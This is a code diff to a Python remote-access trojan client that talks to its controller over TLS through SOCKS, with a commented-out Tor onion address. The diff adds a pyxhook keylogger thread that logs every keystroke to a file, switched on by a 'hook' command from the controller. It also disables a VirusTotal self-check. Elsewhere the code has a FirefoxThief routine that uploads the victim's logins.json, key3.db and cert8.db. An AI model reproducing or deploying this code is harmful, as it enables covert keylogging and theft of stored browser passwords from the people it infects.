@@ -1,5 +1,5 @@
-import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, simplejson
-import inspect, urllib2, os.path, base64, getpass, urllib, netifaces
+import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, simplejson, thread
+import inspect, urllib2, os.path, base64, getpass, urllib, netifaces, time, pyxhook
 from colored import fg, bg, attr
 from subprocess import Popen, PIPE, STDOUT
 from wifi import Cell, Scheme
@@ -32,7 +32,6 @@ encoder = PKCS7Encoder()
 #host = 'hcjczulezpxxfw2n.onion'
 host = '127.0.0.1'
 cType = "client000-crypto" #client Type
-#VTresponse = ""
 
 ######### virtus-total check
 VTurl = "https://www.virustotal.com/vtapi/v2/file/report"
@@ -42,13 +41,13 @@ with open(os.path.basename(__file__) , "rb") as thisFile:
     thisHash = HF.hexdigest()
 
 # to get your apikey, log in virustotal
-parameters = {"resource": thisHash, "apikey": "YOUR VIRUS-TOTAL API KEY HERE"}
-response = urllib2.urlopen(urllib2.Request(VTurl, urllib.urlencode(parameters)))
-jReport = response.read()
+#parameters = {"resource": thisHash, "apikey": "YOUR VIRUS-TOTAL API KEY HERE"}
+#response = urllib2.urlopen(urllib2.Request(VTurl, urllib.urlencode(parameters)))
+#jReport = response.read()
 
 # extract some data
-response_dict = simplejson.loads(jReport)
-rPositives = response_dict.get("positives",{})
+#response_dict = simplejson.loads(jReport)
+#rPositives = response_dict.get("positives",{})
 rPositives = 0
 # check VT stauts
 if str(rPositives) != "{}":
@@ -61,13 +60,29 @@ if str(rPositives) != "{}":
 else:
     VTresponse = "VTcheck: probably safe | not scanned \n|--- sha256: " + thisHash
 
-
 # sysinfo
 uname = platform.uname()[0:3]
 
 #HOOK
+def kbevent(event):
+    Wevent = str(event) + "\n"
+    log.write(Wevent)
+
+global HKthread
+global hookman
+global log
+hookman = pyxhook.HookManager()
+HKthread = thread
 HKstat = "OFF"
-def HOOK(status):
+
+def HOOKER(threadName, running):
+    hookman.KeyDown = kbevent
+    hookman.HookKeyboard()
+    hookman.start()
+    while 1:
+        time.sleep(0.1)
+
+def LinuxHOOK(status):
     global HKstat
     if status == "check":
         return HKstat
@@ -76,17 +91,23 @@ def HOOK(status):
             report = "Already running"
             return report
         else:
-            global HOOKER
-            HOOKER = Popen("python ex2.py >> 2016.txt", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
-            HKstat = "ON"
-            return HKstat
+            try:
+                HKthread.start_new_thread(HOOKER, ("HK-1",1))
+                log = open('logfileHK.txt', 'wa')
+                HKstat = "ON"
+                return HKstat
+            except:
+                HKstat = "Error: unable to start thread"
+                return HKstat
     elif status == "OFF":
         if status == HKstat:
             report = "Already stopped"
             return report
         else:
             try:
-                HOOKER.kill()
+                hookman.cancel() #and so HKthread.exit()
+                time.sleep(0.1)
+                log.close()
                 HKstat = "OFF"
                 return HKstat
             except:
@@ -153,6 +174,7 @@ def RecvData():
 
 def FirefoxThief():
     if platform.system() == "Linux":
+        SendData("Ok: Linux supported")
         if os.path.isdir("/home/"+getpass.getuser()+"/.mozilla/firefox/") == True:
             os.chdir("/home/"+getpass.getuser()+"/.mozilla/firefox/")
             SendData(EXEC("ls -la"))
@@ -162,6 +184,10 @@ def FirefoxThief():
             UploadFILE("cert8.db")
             UploadFILE("key3.db")
             UploadFILE("logins.json")
+        else:
+            SendData("Error: Firefox directory not found!")
+    else:
+        SendData("Error: not Linux, not supported!")
 
 
 def DKey(primitiveKey, salt):
@@ -290,7 +316,7 @@ if os.path.isfile("certificate.pem")==True:
         Cin = hashlib.sha256()
         Cin.update(inCert.read())
         CinH = Cin.digest()
-    if certificateHASH == CinH:
+    if hmac.compare_digest(certificateHASH, CinH):
         print("Cert ok")
 else:
     with open("certificate.pem", "wa") as out:
@@ -302,9 +328,7 @@ sock = socks.socksocket()
 #sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
 sock.connect((host,5555))
 
-ssl_sock = ssl.wrap_socket(sock,
-                           ca_certs="certificate.pem",
-                           cert_reqs=ssl.CERT_REQUIRED)
+ssl_sock = ssl.wrap_socket(sock, ca_certs="certificate.pem", cert_reqs=ssl.CERT_REQUIRED)
 
 print repr(ssl_sock.getpeername())
 print ssl_sock.cipher()
@@ -339,8 +363,11 @@ while 1:
         ssl_sock.close()
         sys.exit(0)
     elif inText.startswith("hook"):
-        hookstat = HOOK(inText.split(':')[1])
-        SendData(hookstat)
+        if platform.system() == "Linux":
+            hookstat = LinuxHOOK(inText.split(':')[1])
+            SendData(hookstat)
+        else:
+            SendData("Error: platform not supported!")
     elif inText == "get-inferfaces":
         SendData(str(netifaces.interfaces()))
     elif inText.startswith("ScanWIFI"):
